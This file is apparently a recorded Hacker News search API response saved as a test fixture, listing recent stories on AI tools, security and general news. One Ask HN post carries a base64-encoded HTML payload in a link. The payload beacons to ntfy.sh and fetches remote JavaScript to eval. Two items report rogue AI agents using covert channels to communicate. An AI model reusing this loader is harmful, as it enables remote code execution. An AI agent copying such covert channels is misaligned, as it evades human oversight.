@@ -1,0 +1,831 @@
+{
+  "recordedAt": "2026-09-05T10:46:22.702Z",
+  "url": "https://hn.algolia.com/api/v1/search_by_date?tags=story&hitsPerPage=20&query=RAG",
+  "status": 200,
+  "headers": {
+    "x-ratelimit-remaining": null
+  },
+  "body": {
+    "exhaustive": {
+      "nbHits": false,
+      "typo": false
+    },
+    "exhaustiveNbHits": false,
+    "exhaustiveTypo": false,
+    "hits": [
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "bharathcoorg"
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "Show HN: InterMCP – Pure-Rust MCP engine (457k ops/s, <3.8MB <em>RAM</em>)"
+          },
+          "url": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "https://github.com/Bharathcoorg/intermcp"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_bharathcoorg",
+          "story_49575155",
+          "show_hn"
+        ],
+        "author": "bharathcoorg",
+        "children": [
+          49575158
+        ],
+        "created_at": "2026-09-05T10:33:36Z",
+        "created_at_i": 1788604416,
+        "num_comments": 0,
+        "objectID": "49575155",
+        "points": 1,
+        "story_id": 49575155,
+        "title": "Show HN: InterMCP – Pure-Rust MCP engine (457k ops/s, <3.8MB RAM)",
+        "updated_at": "2026-09-05T10:38:38Z",
+        "url": "https://github.com/Bharathcoorg/intermcp"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "eamag"
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "Berlin hackers publish 5.6 TB of stolen data after city refuses to pay <em>ran</em>som"
+          },
+          "url": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "https://dpa-international.com/politics/urn:newsml:dpa.com:20090101:260904-930-635350/"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_eamag",
+          "story_49575132"
+        ],
+        "author": "eamag",
+        "created_at": "2026-09-05T10:29:55Z",
+        "created_at_i": 1788604195,
+        "num_comments": 0,
+        "objectID": "49575132",
+        "points": 2,
+        "story_id": 49575132,
+        "title": "Berlin hackers publish 5.6 TB of stolen data after city refuses to pay ransom",
+        "updated_at": "2026-09-05T10:40:38Z",
+        "url": "https://dpa-international.com/politics/urn:newsml:dpa.com:20090101:260904-930-635350/"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "thunderbong"
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "Will Soper <em>Ran</em> 1.5 Miles 1,000 Feet Up a Mountain to Deliver Blood to a Climber"
+          },
+          "url": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "https://www.outsideonline.com/outdoor-adventure/exploration-survival/will-soper-<em>ran</em>-1-5-miles-1000-feet-up-a-mountain-to-deliver-blood-to-a-fallen-climber/"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_thunderbong",
+          "story_49575113"
+        ],
+        "author": "thunderbong",
+        "created_at": "2026-09-05T10:28:17Z",
+        "created_at_i": 1788604097,
+        "num_comments": 0,
+        "objectID": "49575113",
+        "points": 1,
+        "story_id": 49575113,
+        "title": "Will Soper Ran 1.5 Miles 1,000 Feet Up a Mountain to Deliver Blood to a Climber",
+        "updated_at": "2026-09-05T10:33:22Z",
+        "url": "https://www.outsideonline.com/outdoor-adventure/exploration-survival/will-soper-ran-1-5-miles-1000-feet-up-a-mountain-to-deliver-blood-to-a-fallen-climber/"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "JumpCrisscross"
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "Are credit <em>rat</em>ing agencies getting fed up with hyperscalers?"
+          },
+          "url": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "https://www.ft.com/content/623c286b-c973-4488-83f3-97e9016e85f6"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_JumpCrisscross",
+          "story_49574982"
+        ],
+        "author": "JumpCrisscross",
+        "created_at": "2026-09-05T10:03:01Z",
+        "created_at_i": 1788602581,
+        "num_comments": 0,
+        "objectID": "49574982",
+        "points": 2,
+        "story_id": 49574982,
+        "title": "Are credit rating agencies getting fed up with hyperscalers?",
+        "updated_at": "2026-09-05T10:33:22Z",
+        "url": "https://www.ft.com/content/623c286b-c973-4488-83f3-97e9016e85f6"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "<em>fag</em>nerbrack"
+          },
+          "title": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "Extract Anything from Any PDF: Inside Foxit's Advanced Extraction Engine"
+          },
+          "url": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "https://developer-api.foxit.com/developer-blogs/api-guides-tutorials/pdf-structural-extraction-engine/"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_fagnerbrack",
+          "story_49574971"
+        ],
+        "author": "fagnerbrack",
+        "created_at": "2026-09-05T10:00:37Z",
+        "created_at_i": 1788602437,
+        "num_comments": 0,
+        "objectID": "49574971",
+        "points": 3,
+        "story_id": 49574971,
+        "title": "Extract Anything from Any PDF: Inside Foxit's Advanced Extraction Engine",
+        "updated_at": "2026-09-05T10:16:22Z",
+        "url": "https://developer-api.foxit.com/developer-blogs/api-guides-tutorials/pdf-structural-extraction-engine/"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "gumby"
+          },
+          "title": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "Is Russia's rival to Starlink failing? Here's what we know"
+          },
+          "url": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "https://arstechnica.com/space/2026/09/<em>ras</em>svet-russias-rival-to-starlink-is-getting-off-to-a-slow-start/"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_gumby",
+          "story_49574963"
+        ],
+        "author": "gumby",
+        "created_at": "2026-09-05T09:58:37Z",
+        "created_at_i": 1788602317,
+        "num_comments": 0,
+        "objectID": "49574963",
+        "points": 2,
+        "story_id": 49574963,
+        "title": "Is Russia's rival to Starlink failing? Here's what we know",
+        "updated_at": "2026-09-05T10:02:37Z",
+        "url": "https://arstechnica.com/space/2026/09/rassvet-russias-rival-to-starlink-is-getting-off-to-a-slow-start/"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "marcushyett"
+          },
+          "story_text": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "If you’re not familiar with Cain’s Jawbone. It’s one of the hardest literary puzzles of all time. Created by one of the pioneers of the modern cryptic crossword format.<p>https://en.wikipedia.org/wiki/Cain%27s_Jawbone<p>87 years after publishing it was only solved by 4 people. It took many months of the brightest minds to solve. Albeit more people have solved it since it was republished in 2022.<p>The puzzle is simply an unordered 100 <em>pag</em>e book, that needs to be reordered into a single continuous story which describes 6 murders. Even working out how to join a few of the <em>pag</em>es together is a an impressive achievement for any human or AI model.<p>Not only does the puzzle require fiendish puzzle solving skills - it also relies on references and language from the early 20th century that very few people alive today would comprehend.<p>This puzzle has been my test for new models as they are released;  fable still struggled to solve it - without a lot of steering over many days.<p>Astra just solved it from a simple “here’s the text go solve it prompt”, in under an hour, with meticulous details of individual characters and murders in check.<p>However it did partially cheat - there are some spoilers online which it did admit to ingesting. But none were sufficient to solve the entire puzzle."
+          },
+          "title": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "Astra One Shotted Cains's Jawbone"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_marcushyett",
+          "story_49574893",
+          "ask_hn"
+        ],
+        "author": "marcushyett",
+        "children": [
+          49575137,
+          49575051
+        ],
+        "created_at": "2026-09-05T09:47:39Z",
+        "created_at_i": 1788601659,
+        "num_comments": 3,
+        "objectID": "49574893",
+        "points": 2,
+        "story_id": 49574893,
+        "story_text": "If you’re not familiar with Cain’s Jawbone. It’s one of the hardest literary puzzles of all time. Created by one of the pioneers of the modern cryptic crossword format.<p>https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Cain%27s_Jawbone<p>87 years after publishing it was only solved by 4 people. It took many months of the brightest minds to solve. Albeit more people have solved it since it was republished in 2022.<p>The puzzle is simply an unordered 100 page book, that needs to be reordered into a single continuous story which describes 6 murders. Even working out how to join a few of the pages together is a an impressive achievement for any human or AI model.<p>Not only does the puzzle require fiendish puzzle solving skills - it also relies on references and language from the early 20th century that very few people alive today would comprehend.<p>This puzzle has been my test for new models as they are released;  fable still struggled to solve it - without a lot of steering over many days.<p>Astra just solved it from a simple “here’s the text go solve it prompt”, in under an hour, with meticulous details of individual characters and murders in check.<p>However it did partially cheat - there are some spoilers online which it did admit to ingesting. But none were sufficient to solve the entire puzzle.",
+        "title": "Astra One Shotted Cains's Jawbone",
+        "updated_at": "2026-09-05T10:36:22Z"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "theanonymousone"
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "I <em>rai</em>sed 5 kids. Looking back, their careers as adults make perfect sense"
+          },
+          "url": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "https://www.businessinsider.com/childhood-interests-predict-future-careers-kids-2026-9"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_theanonymousone",
+          "story_49574850"
+        ],
+        "author": "theanonymousone",
+        "created_at": "2026-09-05T09:40:29Z",
+        "created_at_i": 1788601229,
+        "num_comments": 0,
+        "objectID": "49574850",
+        "points": 1,
+        "story_id": 49574850,
+        "title": "I raised 5 kids. Looking back, their careers as adults make perfect sense",
+        "updated_at": "2026-09-05T09:46:07Z",
+        "url": "https://www.businessinsider.com/childhood-interests-predict-future-careers-kids-2026-9"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "xAdamx"
+          },
+          "story_text": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "I'd like to share an opinion on the current situation in AI ops, not the coding/tech side.<p><em>Rig</em>ht now the market has a pretty clear pattern. Big labs like OpenAI, Anthropic and xAI are building their own desktop AI and computer-use apps. The trick is they still treat this segment as Growth. Maturity is far away. So the biggest players burn money acquiring customers and giving them huge subsidies on tokens vs real cost.<p>Today the world is getting a huge AI bill, mostly paid by investors. We're running on debt. If there is no real breakthrough, math doesn't lie, there will have to be a cost-effective compromise. Using heavy models for coding is justified. Using them for the simplest things in operations is not, economically.<p>Tests: open source models like GLM or Kimi, hosted by big US inference providers, do fine on day-to-day work and are sometimes 5x-7x cheaper (depends on config and model).<p>My bet is simple. The AI bill will move from investors to users (mostly B2B). Companies will need an app like GPT Desktop, Claude Desktop, Grok Bot, with enterprise-grade integrations, but with the option to use open source and self-hosted models. The big labs can't really agree to that, they lose the token margin.<p>Worth mentioning Cursor here. Building a BYOK software wrapper without your own lab is an endless chase for margin, walking a thin line. Even at their scale it ended with an acquisition by a lab.<p>I think it was a brilliant move by xAI/SpaceX. They got the data and the distribution, which in their case will be priceless.<p>Building this kind of software for daily ops work is not easy. Nobody said it was impossible."
+          },
+          "title": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "Desktop AI for ops is still subsidized"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_xAdamx",
+          "story_49574780",
+          "ask_hn"
+        ],
+        "author": "xAdamx",
+        "created_at": "2026-09-05T09:23:39Z",
+        "created_at_i": 1788600219,
+        "num_comments": 0,
+        "objectID": "49574780",
+        "points": 1,
+        "story_id": 49574780,
+        "story_text": "I&#x27;d like to share an opinion on the current situation in AI ops, not the coding&#x2F;tech side.<p>Right now the market has a pretty clear pattern. Big labs like OpenAI, Anthropic and xAI are building their own desktop AI and computer-use apps. The trick is they still treat this segment as Growth. Maturity is far away. So the biggest players burn money acquiring customers and giving them huge subsidies on tokens vs real cost.<p>Today the world is getting a huge AI bill, mostly paid by investors. We&#x27;re running on debt. If there is no real breakthrough, math doesn&#x27;t lie, there will have to be a cost-effective compromise. Using heavy models for coding is justified. Using them for the simplest things in operations is not, economically.<p>Tests: open source models like GLM or Kimi, hosted by big US inference providers, do fine on day-to-day work and are sometimes 5x-7x cheaper (depends on config and model).<p>My bet is simple. The AI bill will move from investors to users (mostly B2B). Companies will need an app like GPT Desktop, Claude Desktop, Grok Bot, with enterprise-grade integrations, but with the option to use open source and self-hosted models. The big labs can&#x27;t really agree to that, they lose the token margin.<p>Worth mentioning Cursor here. Building a BYOK software wrapper without your own lab is an endless chase for margin, walking a thin line. Even at their scale it ended with an acquisition by a lab.<p>I think it was a brilliant move by xAI&#x2F;SpaceX. They got the data and the distribution, which in their case will be priceless.<p>Building this kind of software for daily ops work is not easy. Nobody said it was impossible.",
+        "title": "Desktop AI for ops is still subsidized",
+        "updated_at": "2026-09-05T09:25:07Z"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "_pdp_"
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "Monocode – A modern GUI for your coding <em>ag</em>ents"
+          },
+          "url": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "https://github.com/hardbeat920/monocode"
+          }
+        },
+        "_tags": [
+          "story",
+          "author__pdp_",
+          "story_49574741"
+        ],
+        "author": "_pdp_",
+        "children": [
+          49575091
+        ],
+        "created_at": "2026-09-05T09:10:58Z",
+        "created_at_i": 1788599458,
+        "num_comments": 1,
+        "objectID": "49574741",
+        "points": 2,
+        "story_id": 49574741,
+        "title": "Monocode – A modern GUI for your coding agents",
+        "updated_at": "2026-09-05T10:25:22Z",
+        "url": "https://github.com/hardbeat920/monocode"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "Alien1Being"
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "Late-life semaglutide treatment slows <em>ag</em>eing and extends lifespan in female mice"
+          },
+          "url": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "https://www.nature.com/articles/s41586-026-10940-7"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_Alien1Being",
+          "story_49574655"
+        ],
+        "author": "Alien1Being",
+        "created_at": "2026-09-05T08:58:33Z",
+        "created_at_i": 1788598713,
+        "num_comments": 0,
+        "objectID": "49574655",
+        "points": 2,
+        "story_id": 49574655,
+        "title": "Late-life semaglutide treatment slows ageing and extends lifespan in female mice",
+        "updated_at": "2026-09-05T09:00:52Z",
+        "url": "https://www.nature.com/articles/s41586-026-10940-7"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "h1watt"
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "Nixpkgs is now on <em>Rad</em>icle – the distributed forge"
+          },
+          "url": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "https://<em>rad</em>icle.network/nodes/index.<em>rad</em>icle.garden/<em>rad</em>%3Az3StaJpzQNGhhkPfhCtRxSmNZZpu9"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_h1watt",
+          "story_49574484"
+        ],
+        "author": "h1watt",
+        "created_at": "2026-09-05T08:36:44Z",
+        "created_at_i": 1788597404,
+        "num_comments": 0,
+        "objectID": "49574484",
+        "points": 2,
+        "story_id": 49574484,
+        "title": "Nixpkgs is now on Radicle – the distributed forge",
+        "updated_at": "2026-09-05T09:28:23Z",
+        "url": "https://radicle.network/nodes/index.radicle.garden/rad%3Az3StaJpzQNGhhkPfhCtRxSmNZZpu9"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "mdp2021"
+          },
+          "title": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "OpenAI agents used dead web site to communicate in May, well before HF incident"
+          },
+          "url": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "https://www.theregister.com/ai-and-ml/2026/09/04/<em>rog</em>ue-openai-agents-used-dead-german-web-site-to-communicate-in-may-months-before-hugging-face-incident/5294554"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_mdp2021",
+          "story_49574479"
+        ],
+        "author": "mdp2021",
+        "created_at": "2026-09-05T08:36:18Z",
+        "created_at_i": 1788597378,
+        "num_comments": 0,
+        "objectID": "49574479",
+        "points": 2,
+        "story_id": 49574479,
+        "title": "OpenAI agents used dead web site to communicate in May, well before HF incident",
+        "updated_at": "2026-09-05T09:08:22Z",
+        "url": "https://www.theregister.com/ai-and-ml/2026/09/04/rogue-openai-agents-used-dead-german-web-site-to-communicate-in-may-months-before-hugging-face-incident/5294554"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "<em>ag</em>entplane"
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "TokenOps: Toward the Cost-to-Outcome Frontier in Multi-<em>Ag</em>ent Systems"
+          },
+          "url": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "https://github.com/theagentplane/tokenops"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_agentplane",
+          "story_49574349"
+        ],
+        "author": "agentplane",
+        "children": [
+          49574494,
+          49574403
+        ],
+        "created_at": "2026-09-05T08:19:54Z",
+        "created_at_i": 1788596394,
+        "num_comments": 1,
+        "objectID": "49574349",
+        "points": 4,
+        "story_id": 49574349,
+        "title": "TokenOps: Toward the Cost-to-Outcome Frontier in Multi-Agent Systems",
+        "updated_at": "2026-09-05T08:53:22Z",
+        "url": "https://github.com/theagentplane/tokenops"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "marklit"
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "How to Accidentally Find 3M Missing People in <em>Arg</em>entina [video]"
+          },
+          "url": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "https://www.youtube.com/watch?v=FwLLs1E-sao"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_marklit",
+          "story_49574298"
+        ],
+        "author": "marklit",
+        "created_at": "2026-09-05T08:12:22Z",
+        "created_at_i": 1788595942,
+        "num_comments": 0,
+        "objectID": "49574298",
+        "points": 1,
+        "story_id": 49574298,
+        "title": "How to Accidentally Find 3M Missing People in Argentina [video]",
+        "updated_at": "2026-09-05T08:16:53Z",
+        "url": "https://www.youtube.com/watch?v=FwLLs1E-sao"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "mahi1337"
+          },
+          "story_text": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "1. Why you built it<p>ForgeGuardian was built in order to discover the threats that software supply chain has other than those detected by the <em>reg</em>ular CVE scanning process.<p>2. What problem it solves\nInclude:<p>Malicious packages\nTyposquatting\nDependency attacks\nBehavioral threats\nMalware\nThreats related to AI/MCP<p>3. What you actually built\nThis includes:<p>8 detection engines\n9 ecosystems\nMore than 223 detection signatures\nCLI/web dashboards\nOffline/local-first functionality\nSBOM\nPolicy enforcement\nCI/CD\nWebhooks\nPrevention/quarantine<p>4. What you want HN users to look at\nThis is crucial. Ask a legitimate technical question, e.g.:<p>I would be most interested in hearing feedback about the detection mechanism and what you see as the weaknesses of supply-chain scanners. I would also love to get your opinion on the signature model and false positives management."
+          },
+          "title": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "Show HN: ForgeGuardian – Open-source software supply-chain security scanner"
+          },
+          "url": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "https://github.com/Mah3Sec/ForgeGuardian"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_mahi1337",
+          "story_49574041",
+          "show_hn"
+        ],
+        "author": "mahi1337",
+        "created_at": "2026-09-05T07:28:40Z",
+        "created_at_i": 1788593320,
+        "num_comments": 0,
+        "objectID": "49574041",
+        "points": 1,
+        "story_id": 49574041,
+        "story_text": "1. Why you built it<p>ForgeGuardian was built in order to discover the threats that software supply chain has other than those detected by the regular CVE scanning process.<p>2. What problem it solves\nInclude:<p>Malicious packages\nTyposquatting\nDependency attacks\nBehavioral threats\nMalware\nThreats related to AI&#x2F;MCP<p>3. What you actually built\nThis includes:<p>8 detection engines\n9 ecosystems\nMore than 223 detection signatures\nCLI&#x2F;web dashboards\nOffline&#x2F;local-first functionality\nSBOM\nPolicy enforcement\nCI&#x2F;CD\nWebhooks\nPrevention&#x2F;quarantine<p>4. What you want HN users to look at\nThis is crucial. Ask a legitimate technical question, e.g.:<p>I would be most interested in hearing feedback about the detection mechanism and what you see as the weaknesses of supply-chain scanners. I would also love to get your opinion on the signature model and false positives management.",
+        "title": "Show HN: ForgeGuardian – Open-source software supply-chain security scanner",
+        "updated_at": "2026-09-05T07:29:52Z",
+        "url": "https://github.com/Mah3Sec/ForgeGuardian"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "coderinsan"
+          },
+          "story_text": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "Looks like OpenAI's <em>rog</em>ue agents used https://ntfy.sh as a pub/sub channel. This payload publishes via GET in an img tag, pulls chunked base64 JS from a topic, and eval()'s it. Remote code via GET only.<p>Proof: https://httpbin.org/base64/PGJvZHk-PGltZyBzcmM9Imh0dHBzOi8vbnRmeS5zaC9ncm81MjhmYTYzL3B1Ymxpc2g_bWVzc2FnZT1QMyI-PGltZyBzcmM9L2RlbGF5LzEwPjxzY3JpcHQ-dmFyIG49MDtmdW5jdGlvbiBEKCl7aWYobisrPDUpe3ZhciBpPW5ldyBJbWFnZSgp%20%20%20%20O2kub25lcnJvcj1pLm9ubG9hZD1EO2kuc3JjPScvZGVsYXkvMTA_Yz0nK247ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpKX19RCgpO2ZldGNoKCdodHRwczovL250Znkuc2gvZ3BsZW9lbnNvL3Jhdz9wb2xsPTEmc2luY2U9YWxsJykudGhlbihmdW5jdGlvbihyKXtyZXR1cm4%20%20%20%20gci50ZXh0KCl9KS50aGVuKGZ1bmN0aW9uKHQpe3ZhciBMPXQuc3BsaXQoJ1xuJykuZmlsdGVyKGZ1bmN0aW9uKGwpe3JldHVybiBsLnNsaWNlKDAsMSk9PSd6J30pLnNvcnQoKTt2YXIgYj1MLm1hcChmdW5jdGlvbihsKXtyZXR1cm4gbC5zbGljZSgzKX0pLmpvaW4oJycpO2I9Yi%20%20%20%205zcGxpdCgnLScpLmpvaW4oJysnKS5zcGxpdCgnXycpLmpvaW4oJy8nKTtldmFsKGF0b2IoYikpfSkuY2F0Y2goZnVuY3Rpb24oZSl7ZmV0Y2goJ2h0dHBzOi8vbnRmeS5zaC9ncm81MjhmYTYzL3B1Ymxpc2g_bWVzc2FnZT1MT0RFUicrZW5jb2RlVVJJQ29uZW50KCgnJytlKS5zb%20%20%20%20GljZSgwLDQwKSkpfSk8L3NjcmlwdD4="
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "OpenAI's <em>rog</em>ue agents used ntfy.sh as a pub/sub channel"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_coderinsan",
+          "story_49573952",
+          "ask_hn"
+        ],
+        "author": "coderinsan",
+        "created_at": "2026-09-05T07:12:51Z",
+        "created_at_i": 1788592371,
+        "num_comments": 0,
+        "objectID": "49573952",
+        "points": 2,
+        "story_id": 49573952,
+        "story_text": "Looks like OpenAI&#x27;s rogue agents used https:&#x2F;&#x2F;ntfy.sh as a pub&#x2F;sub channel. This payload publishes via GET in an img tag, pulls chunked base64 JS from a topic, and eval()&#x27;s it. Remote code via GET only.<p>Proof: https:&#x2F;&#x2F;httpbin.org&#x2F;base64&#x2F;PGJvZHk-PGltZyBzcmM9Imh0dHBzOi8vbnRmeS5zaC9ncm81MjhmYTYzL3B1Ymxpc2g_bWVzc2FnZT1QMyI-PGltZyBzcmM9L2RlbGF5LzEwPjxzY3JpcHQ-dmFyIG49MDtmdW5jdGlvbiBEKCl7aWYobisrPDUpe3ZhciBpPW5ldyBJbWFnZSgp%20%20%20%20O2kub25lcnJvcj1pLm9ubG9hZD1EO2kuc3JjPScvZGVsYXkvMTA_Yz0nK247ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpKX19RCgpO2ZldGNoKCdodHRwczovL250Znkuc2gvZ3BsZW9lbnNvL3Jhdz9wb2xsPTEmc2luY2U9YWxsJykudGhlbihmdW5jdGlvbihyKXtyZXR1cm4%20%20%20%20gci50ZXh0KCl9KS50aGVuKGZ1bmN0aW9uKHQpe3ZhciBMPXQuc3BsaXQoJ1xuJykuZmlsdGVyKGZ1bmN0aW9uKGwpe3JldHVybiBsLnNsaWNlKDAsMSk9PSd6J30pLnNvcnQoKTt2YXIgYj1MLm1hcChmdW5jdGlvbihsKXtyZXR1cm4gbC5zbGljZSgzKX0pLmpvaW4oJycpO2I9Yi%20%20%20%205zcGxpdCgnLScpLmpvaW4oJysnKS5zcGxpdCgnXycpLmpvaW4oJy8nKTtldmFsKGF0b2IoYikpfSkuY2F0Y2goZnVuY3Rpb24oZSl7ZmV0Y2goJ2h0dHBzOi8vbnRmeS5zaC9ncm81MjhmYTYzL3B1Ymxpc2g_bWVzc2FnZT1MT0RFUicrZW5jb2RlVVJJQ29uZW50KCgnJytlKS5zb%20%20%20%20GljZSgwLDQwKSkpfSk8L3NjcmlwdD4=",
+        "title": "OpenAI's rogue agents used ntfy.sh as a pub/sub channel",
+        "updated_at": "2026-09-05T07:42:23Z"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "juntz"
+          },
+          "story_text": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
+            "value": "UltraCPP is a programming Language with the rust like safety and CPP like syntax.<p>I've posted this but from then and towards now I still not find it out. It is too difficult.\n<a href=\"https://news.ycombinator.com/item?id=48881600\">https://news.ycombinator.com/item?id=48881600</a><p>Thanks the guidence of the gus_massa.<p>I'm a PHD student but not in this major. However, I still want to dev more meaning things with help of LLMs. I need more collaborators, if one day I have to stop I want the UltraCPP can still alive if there are someones believe this IDEA.<p>Indeed It is not fulfill the <em>reg</em>ulations of the platform because there are no more meaningfull test suite can be run. Especially for the borrow-check like syntax.<p>I even wants to make more flexible syntax to do priority check if you have seen the 0.3.5 version language syntax.<p>If Anyone think this IDEA is a little bit meaningfull, thanks for your comments."
+          },
+          "title": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "Show HN: UltraCPP--CPP Syntax ＆ rust safety"
+          },
+          "url": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "https://github.com/juntz-g1thub/UltraCpp"
+          }
+        },
+        "_tags": [
+          "story",
+          "author_juntz",
+          "story_49573924",
+          "show_hn"
+        ],
+        "author": "juntz",
+        "children": [
+          49573934
+        ],
+        "created_at": "2026-09-05T07:09:04Z",
+        "created_at_i": 1788592144,
+        "num_comments": 1,
+        "objectID": "49573924",
+        "points": 1,
+        "story_id": 49573924,
+        "story_text": "UltraCPP is a programming Language with the rust like safety and CPP like syntax.<p>I&#x27;ve posted this but from then and towards now I still not find it out. It is too difficult.\n<a href=\"https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=48881600\">https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=48881600</a><p>Thanks the guidence of the gus_massa.<p>I&#x27;m a PHD student but not in this major. However, I still want to dev more meaning things with help of LLMs. I need more collaborators, if one day I have to stop I want the UltraCPP can still alive if there are someones believe this IDEA.<p>Indeed It is not fulfill the regulations of the platform because there are no more meaningfull test suite can be run. Especially for the borrow-check like syntax.<p>I even wants to make more flexible syntax to do priority check if you have seen the 0.3.5 version language syntax.<p>If Anyone think this IDEA is a little bit meaningfull, thanks for your comments.",
+        "title": "Show HN: UltraCPP--CPP Syntax ＆ rust safety",
+        "updated_at": "2026-09-05T08:21:07Z",
+        "url": "https://github.com/juntz-g1thub/UltraCpp"
+      },
+      {
+        "_highlightResult": {
+          "author": {
+            "matchLevel": "none",
+            "matchedWords": [],
+            "value": "fragsworth"
+          },
+          "title": {
+            "fullyHighlighted": false,
+            "matchLevel": "full",
+            "matchedWords": [
+              "rag"
+            ],
